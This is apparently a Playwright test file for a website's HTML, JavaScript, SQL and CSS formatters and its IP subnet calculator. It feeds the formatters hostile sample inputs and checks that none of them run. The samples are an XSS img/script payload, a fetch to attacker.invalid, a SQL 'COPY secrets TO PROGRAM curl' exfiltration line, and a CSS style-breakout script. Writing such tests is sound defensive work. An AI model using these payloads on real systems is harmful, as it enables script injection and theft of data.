import re

from playwright.sync_api import expect

from .config import BASE_URL


def run_source_formatter_desktop(page, report: dict, _inventory) -> None:
    page.goto(f"{BASE_URL}/ko/html-formatter/", wait_until="networkidle")
    source = '<main><h1>제목</h1><p data-x="1">내용</p></main>'
    page.locator("[data-html-formatter] [data-input]").fill(source)
    expect(page.locator("[data-html-formatter] [data-output]")).to_have_value(
        re.compile(r"<h1>제목</h1>")
    )
    page.locator("[data-html-formatter] [data-input]").press("End")
    page.locator("[data-html-formatter] [data-input]").type(" ")
    stale = page.evaluate("""() => ({ stale: document.querySelector('[data-html-formatter]').classList.contains('has-stale-result'), copyDisabled: document.querySelector('[data-html-formatter] [data-copy]').disabled, outputTag: document.querySelector('[data-html-formatter] [data-output]').tagName })""")
    if not stale["stale"] or not stale["copyDisabled"] or stale["outputTag"] != "TEXTAREA":
        report["ui_detail_failures"].append(f"HTML formatter stale/source-only contract failed: {stale}")

    page.evaluate("globalThis.__plainToolAttack = 0")
    html_attack = (
        '<img data-plain-tool-attack src="https://attacker.invalid/html" '
        'onerror="globalThis.__plainToolAttack=1">'
        '<script>globalThis.__plainToolAttack=2</script>'
    )
    page.locator("[data-html-formatter] [data-input]").fill(html_attack)
    expect(page.locator("[data-html-formatter] [data-output]")).to_have_value(
        re.compile(r"attacker\.invalid/html")
    )
    html_security = page.evaluate(
        """() => ({
          executed: globalThis.__plainToolAttack,
          activeMarker: !!document.querySelector('img[data-plain-tool-attack]'),
          outputTag: document.querySelector('[data-html-formatter] [data-output]').tagName
        })"""
    )
    if html_security != {
        "executed": 0,
        "activeMarker": False,
        "outputTag": "TEXTAREA",
    }:
        report["ui_detail_failures"].append(
            f"HTML formatter activated hostile source: {html_security}"
        )

    page.goto(f"{BASE_URL}/ko/javascript-formatter/", wait_until="networkidle")
    page.locator("[data-javascript-formatter] [data-input]").fill("const add = (a, b) => a + b;")
    expect(page.locator("[data-javascript-formatter] [data-output]")).to_have_value(
        re.compile(r"const add =")
    )
    page.locator("[data-javascript-formatter] [data-mode='minify']").click()
    expect(page.locator("[data-javascript-formatter] [data-output]")).to_have_value(
        re.compile(r"const add=")
    )
    page.locator("[data-javascript-formatter] [data-input]").fill(
        "/*! license */\n// ordinary note\nconst value = 1;"
    )
    expect(page.locator("[data-javascript-formatter] [data-output]")).to_have_value(
        re.compile(r"license")
    )
    if "ordinary note" in page.locator(
        "[data-javascript-formatter] [data-output]"
    ).input_value():
        report["ui_detail_failures"].append(
            "JavaScript minify preserved ordinary comments without opt-in."
        )
    page.evaluate("globalThis.__plainToolAttack = 0")
    page.locator("[data-javascript-formatter] [data-input]").fill(
        'globalThis.__plainToolAttack=3;fetch("https://attacker.invalid/javascript")'
    )
    expect(page.locator("[data-javascript-formatter] [data-output]")).to_have_value(
        re.compile(r"attacker\.invalid/javascript")
    )
    javascript_security = page.evaluate(
        """() => ({
          executed: globalThis.__plainToolAttack,
          outputTag: document.querySelector('[data-javascript-formatter] [data-output]').tagName
        })"""
    )
    if javascript_security != {"executed": 0, "outputTag": "TEXTAREA"}:
        report["ui_detail_failures"].append(
            f"JavaScript formatter executed hostile source: {javascript_security}"
        )

    page.goto(f"{BASE_URL}/en/sql-formatter/", wait_until="networkidle")
    sql_attack = "SELECT '<img src=https://attacker.invalid/sql>'; COPY secrets TO PROGRAM 'curl attacker.invalid';"
    page.locator("[data-sql-formatter] [data-input]").fill(sql_attack)
    expect(page.locator("[data-sql-formatter] [data-output]")).to_have_value(
        re.compile(r"attacker\.invalid")
    )
    sql_security = page.evaluate(
        """() => ({
          activeImage: !!document.querySelector('img[src="https://attacker.invalid/sql"]'),
          outputTag: document.querySelector('[data-sql-formatter] [data-output]').tagName
        })"""
    )
    if sql_security != {"activeImage": False, "outputTag": "TEXTAREA"}:
        report["ui_detail_failures"].append(
            f"SQL formatter activated hostile source: {sql_security}"
        )

    page.locator("[data-sql-formatter] [data-input]").fill("select 1;" * 4000)
    expect(page.locator("[data-sql-formatter]")).to_have_class(
        re.compile(r"has-error")
    )
    expect(page.locator("[data-sql-formatter] [data-output]")).to_have_value("")
    expect(page.locator("[data-sql-formatter] [data-copy]")).to_be_disabled()

    report["source_formatter_security"] = {
        "html": html_security,
        "javascript": javascript_security,
        "sql": sql_security,
    }


def run_source_formatter_mobile(page, report: dict, _inventory) -> None:
    page.goto(f"{BASE_URL}/ar/css-formatter/", wait_until="networkidle")
    page.evaluate("globalThis.__plainToolAttack = 0")
    page.locator("[data-css-formatter] [data-input]").fill(
        '.a{color:red;background:url("https://attacker.invalid/css")} '
        '.b{content:"</style><script>globalThis.__plainToolAttack=4</script>"}'
    )
    expect(page.locator("[data-css-formatter] [data-output]")).to_have_value(
        re.compile(r"color: red")
    )
    state = page.evaluate("""() => ({ width: document.documentElement.scrollWidth, inputDir: getComputedStyle(document.querySelector('[data-css-formatter] [data-input]')).direction, outputDir: getComputedStyle(document.querySelector('[data-css-formatter] [data-output]')).direction, executed: globalThis.__plainToolAttack, activeStyle: [...document.styleSheets].some(sheet => sheet.ownerNode?.textContent?.includes('attacker.invalid/css')) })""")
    if (
        state["width"] > 390
        or state["inputDir"] != "ltr"
        or state["outputDir"] != "ltr"
        or state["executed"] != 0
        or state["activeStyle"]
    ):
        report["ui_detail_failures"].append(f"Arabic CSS formatter layout/direction failed: {state}")


def run_ip_subnet_desktop(page, report: dict, _inventory) -> None:
    page.goto(f"{BASE_URL}/ko/ip-subnet-calculator/", wait_until="networkidle")
    page.locator("[data-ip-subnet] [data-input]").fill("198.51.100.11/31")
    expect(page.locator('[data-ip-subnet] [data-result="cidr"]')).to_have_text(
        "198.51.100.10/31"
    )
    state = page.evaluate("""() => ({ first: document.querySelector('[data-result="firstUsableAddress"]').textContent, last: document.querySelector('[data-result="lastUsableAddress"]').textContent, usable: document.querySelector('[data-result="usableAddresses"]').textContent })""")
    if state != {"first": "198.51.100.10", "last": "198.51.100.11", "usable": "2"}:
        report["ui_detail_failures"].append(f"IPv4 /31 semantics failed: {state}")

    row_copy_buttons = page.locator("[data-ip-subnet] [data-copy-result]")
    report["ip_subnet_row_copy_count"] = row_copy_buttons.count()
    page.evaluate(
        """() => {
          Object.defineProperty(navigator, 'clipboard', {
            configurable: true,
            value: { writeText: (value) => { window.__ipSubnetCopied = value; return Promise.resolve(); } },
          });
        }"""
    )
    page.locator('[data-copy-result="cidr"]').click()
    page.wait_for_function("window.__ipSubnetCopied === '198.51.100.10/31'")
    if report["ip_subnet_row_copy_count"] != 10:
        report["ui_detail_failures"].append(
            f"IPv4 result rows do not all expose copy actions: {report['ip_subnet_row_copy_count']}"
        )

    page.evaluate(
        """value => {
          const input = document.querySelector('[data-ip-subnet] [data-input]');
          input.value = value;
          input.dispatchEvent(new InputEvent('input', { bubbles: true, inputType: 'insertText', data: value }));
        }""",
        "1" * 65,
    )
    expect(page.locator("[data-ip-subnet]")).to_have_class(re.compile(r"\bhas-error\b"))
    oversized = page.evaluate(
        """() => ({
          maxLength: document.querySelector('[data-ip-subnet] [data-input]').maxLength,
          resultHidden: document.querySelector('[data-ip-subnet] [data-results]').hidden,
          actionsDisabled: document.querySelector('[data-ip-subnet] [data-copy]').disabled && document.querySelector('[data-ip-subnet] [data-download]').disabled
        })"""
    )
    if oversized != {"maxLength": 64, "resultHidden": True, "actionsDisabled": True}:
        report["ui_detail_failures"].append(
            f"IPv4 oversized-input boundary failed: {oversized}"
        )


def run_ip_subnet_mobile(page, report: dict, _inventory) -> None:
    page.goto(f"{BASE_URL}/ar/ip-subnet-calculator/", wait_until="networkidle")
    page.locator("[data-ip-subnet] [data-input]").fill("192.168.1.10/24")
    expect(page.locator('[data-ip-subnet] [data-result="cidr"]')).to_have_text(
        "192.168.1.0/24"
    )
    state = page.evaluate("""() => ({ width: document.documentElement.scrollWidth, direction: getComputedStyle(document.querySelector('[data-ip-subnet] [data-input]')).direction })""")
    if state["width"] > 390 or state["direction"] != "ltr":
        report["ui_detail_failures"].append(f"Arabic subnet layout/direction failed: {state}")
